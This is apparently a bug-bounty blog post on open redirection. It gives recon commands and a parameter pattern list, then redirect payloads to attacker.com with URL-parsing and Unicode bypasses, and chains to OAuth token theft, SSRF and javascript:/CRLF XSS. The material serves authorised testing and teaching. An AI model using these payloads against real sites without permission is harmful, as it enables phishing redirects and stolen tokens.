---
layout: post
title: Open Redirection Guide
categories: bughunting 
---

### Identify:
* [waybackurls](https://github.com/tomnomnom/waybackurls) + [hakrawler](https://github.com/hakluke/hakrawler) + [gf](https://github.com/tomnomnom/gf)
	
	*1*. ``cat subdomains | waybackurls | tee -a urls``
	
	*2*. ``cat subdomains | hakrawler -depth 3 -plain | tee -a urls``
	
	*3*. ``gf redirect urls``

	using ``redirect.json``:
```json
{
    "flags" : "-HanrE",
    "pattern" : "url=|rt=|cgi-bin/redirect.cgi|continue=|dest=|destination=|go=|out=|redir=|redirect_uri=|redirect_url=|return=|return_path=|returnTo=|rurl=|target=|view=|from_url=|load_url=|file_url=|page_url=|file_name=|page=|folder=|folder_url=|login_url=|img_url=|return_url=|return_to=|next=|redirect=|redirect_to=|logout=|checkout=|checkout_url=|goto=|next_page=|file=|load_file="
}
```
* Google dorks
	``site:domain.com inrul:[PARAMETER]`` using the [parameter list](https://github.com/victoni/Bug-Bounty-Scripts/blob/master/open_redirection_parameters.txt)
* Manual inspection by navigating the webapp and intercepting the requests


### Exploit:
```
* ?redirect=http://example.com
* ?redirect=https://company.com.attacker.com
* ?redirect=https://company.com@attacker.com
* ?redirect=//attacker.com
* ?redirect=http://attacker.com#company.com
* ?redirect=http://attacker.com?company.com
* ?redirect=http://attacker.com/company.com
* ?redirect=http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ

Using special characters:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 。
```
## Escalating to other vulnerabilities:
 [Source](https://twitter.com/LooseSecurity/status/1120638007760117760)
```
Open Redirect + Miconfigured OAuth App => OAuth Token Stealing
Open Redirect + Filtered SSRF => SSRF
Open Redirect + CRLFi => XSS
Open Redirect + javascript URI => XSS
```

Escalate to XSS
* `` ?redirect=javascript:alert(1)``
* `` ?redirect=javascript:prompt(1)``

Escalate to XSS using CRLFi
* ``?redirect=java%0d%0ascript%0d%0a:alert(0)``
